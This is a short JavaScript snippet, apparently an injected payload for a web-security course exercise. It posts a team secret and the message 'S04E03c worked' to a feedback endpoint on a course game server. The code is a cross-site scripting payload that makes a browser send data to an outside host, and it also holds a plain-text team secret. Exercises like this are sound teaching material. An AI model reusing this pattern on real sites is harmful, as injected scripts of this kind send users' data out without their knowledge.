

var xhr = new XMLHttpRequest();
var data = new FormData();

data.append('team_secret','ba316432f8e15f8e');
data.append('secret','S04E03c worked');

xhr.open("POST","https://gameserver.websec.saarland/feedback/8",true);
xhr.send(data);